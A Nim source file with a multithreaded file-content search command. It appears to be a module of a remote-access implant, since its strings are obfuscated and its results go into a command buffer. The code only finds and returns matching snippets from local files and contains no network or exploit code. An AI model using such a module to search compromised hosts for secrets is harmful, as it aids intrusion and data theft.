import std/[algorithm, json, locks, strutils]
from posix import S_ISDIR, Stat
import ../utils/global
import execution
import ../utils/linapi/handlers

proc run_search*(args, input, params: string; buf: var openArray[char]): int =
  # Main function that searches files for a term
  const
    defaultThreads = 4
    maxThreads = 32
    defaultSizeLimitMb = 200
    maxFiles = 50_000
    contextRadius = 500

  type
    Hit = tuple[idx: int, path: string, snippet: string]
    Ctx = ref object
      lk: Lock
      files: seq[string]
      nextIdx: int
      hits: seq[Hit]
      needle: string
      needleLower: string
      sizeLimitBytes: int
      caseSensitive: bool

  proc normPath(p: string): string =
    # Cleans a path by stripping spaces and trailing slashes
    var s = p.strip().replace("\\", "/")
    while s.len > 1 and s[^1] == '/':
      s.setLen(s.len - 1)
    s

  proc paramStr(key: string): string =
    # Reads a string parameter from json
    try:
      let p = parseJson(params)
      if p.hasKey(key):
        return p[key].getStr().strip()
    except JsonParsingError:
      discard
    ""

  proc paramBool(key: string): bool =
    # Reads a bool parameter from json
    try:
      let p = parseJson(params)
      if not p.hasKey(key):
        return false
      let n = p[key]
      if n.kind == JBool:
        return n.getBool()
      let s = n.getStr().strip().toLowerAscii()
      s in [obf("1"), obf("true"), obf("yes"), obf("on")]
    except JsonParsingError:
      false

  proc paramInt(key: string; defaultVal: int): int =
    # Reads an int parameter from json
    try:
      let p = parseJson(params)
      if not p.hasKey(key):
        return defaultVal
      let n = p[key]
      if n.kind == JInt:
        return n.getInt()
      return parseInt(n.getStr())
    except Exception:
      defaultVal

  proc readTextFile(path: string; maxBytes: int): string =
    # Reads a text file up to a byte limit
    var st: Stat
    if not pathStat(path, st):
      return ""
    if S_ISDIR(st.st_mode):
      return ""
    let total = st.st_size.int
    if total <= 0 or total > maxBytes:
      return ""
    let rd = readFileBytes(path)
    if not rd.ok:
      return ""
    if rd.data.len == 0:
      return ""
    var nulls = 0
    let probe = min(rd.data.len, 8192)
    for i in 0 ..< probe:
      if rd.data[i] == 0:
        inc nulls
    if nulls > 2:
      return ""
    result = newString(rd.data.len)
    copyMem(addr result[0], addr rd.data[0], rd.data.len)

  proc matchSnippet(raw, needle, needleLower: string; caseSensitive: bool): string =
    # Finds a match and returns a short snippet
    if raw.len == 0 or needle.len == 0:
      return ""
    let pos =
      if caseSensitive:
        raw.find(needle)
      else:
        raw.toLowerAscii().find(needleLower)
    if pos < 0:
      return ""
    var lineStart = pos
    while lineStart > 0 and raw[lineStart - 1] notin ['\n', '\r']:
      lineStart -= 1
    var lineEnd = pos
    while lineEnd < raw.len and raw[lineEnd] notin ['\n', '\r']:
      lineEnd += 1
    let line = raw[lineStart ..< lineEnd]
    let matchInLine = pos - lineStart
    var snipStart = matchInLine - contextRadius
    if snipStart < 0:
      snipStart = 0
    var snipEnd = matchInLine + needle.len + contextRadius
    if snipEnd > line.len:
      snipEnd = line.len
    line[snipStart ..< snipEnd]

  proc firstMatchInFile(
    path, needle, needleLower: string; maxBytes: int; caseSensitive: bool
  ): string =
    # Returns the first matching snippet in a file
    matchSnippet(readTextFile(path, maxBytes), needle, needleLower, caseSensitive)

  proc collectFiles(root: string; recursive: bool; files: var seq[string]) =
    # Collects file paths under a root
    if files.len >= maxFiles:
      return
    if not pathIsDir(root):
      if pathExists(root):
        files.add(root)
      return
    for ent in listDirEntries(root):
      let full = joinPath(root, ent.name)
      if ent.isDir:
        if recursive:
          collectFiles(full, recursive, files)
      elif files.len < maxFiles:
        files.add(full)

  proc worker(param: pointer): pointer {.noconv.} =
    # Worker that searches assigned files for a match
    let ctx = cast[Ctx](param)
    while true:
      acquire(ctx.lk)
      if ctx.nextIdx >= ctx.files.len:
        release(ctx.lk)
        break
      let idx = ctx.nextIdx
      ctx.nextIdx += 1
      release(ctx.lk)
      let path = ctx.files[idx]
      let snippet = firstMatchInFile(
        path, ctx.needle, ctx.needleLower, ctx.sizeLimitBytes, ctx.caseSensitive
      )
      if snippet.len == 0:
        continue
      acquire(ctx.lk)
      ctx.hits.add((idx, path, snippet))
      release(ctx.lk)
    nil

  var root = normPath(paramStr(obf("path")))
  if root.len == 0 and args.strip().len > 0:
    root = normPath(args)
  let needle = paramStr(obf("content"))
  if needle.len == 0:
    return execution.writeMsg(obf("Error: missing search term (use --content)"), buf)
  if root.len == 0:
    return execution.writeMsg(obf("Error: missing path (use --path)"), buf)

  let recursive = paramBool(obf("recursive"))
  let caseSensitive = paramBool(obf("case_sensitive"))
  var sizeMb = paramInt(obf("size_limit"), defaultSizeLimitMb)
  if sizeMb < 1:
    sizeMb = 1
  let sizeLimitBytes = sizeMb * 1024 * 1024
  var workers = paramInt(obf("thread"), defaultThreads)
  if workers < 1:
    workers = 1
  elif workers > maxThreads:
    workers = maxThreads

  let ctx = Ctx(
    files: @[],
    nextIdx: 0,
    hits: @[],
    needle: needle,
    needleLower: needle.toLowerAscii(),
    sizeLimitBytes: sizeLimitBytes,
    caseSensitive: caseSensitive,
  )
  initLock(ctx.lk)
  collectFiles(root, recursive, ctx.files)
  if ctx.files.len == 0:
    return execution.writeMsg(obf("No files to search"), buf)

  if workers == 1:
    discard worker(cast[pointer](ctx))
  else:
    var tids: array[maxThreads, Pthread]
    var nTids = 0
    for _ in 0 ..< workers:
      if spawnPthread(tids[nTids], worker, cast[pointer](ctx)):
        nTids += 1
    for i in 0 ..< nTids:
      joinPthread(tids[i])
    if nTids == 0:
      discard worker(cast[pointer](ctx))

  ctx.hits.sort(proc(a, b: Hit): int =
    # Compares two hit indexes
    cmp(a.idx, b.idx))

  var report = ""
  for h in ctx.hits:
    report &= obf("[*] FOUND: ") & h.path & "\n\n" & obf("Content: ") & "\"" & h.snippet & "\"\n\n"
  if report.len == 0:
    return execution.writeMsg(obf("No matches"), buf)
  if report.len > buf.len:
    report = report[0 ..< buf.len]
  execution.writeMsg(report, buf)
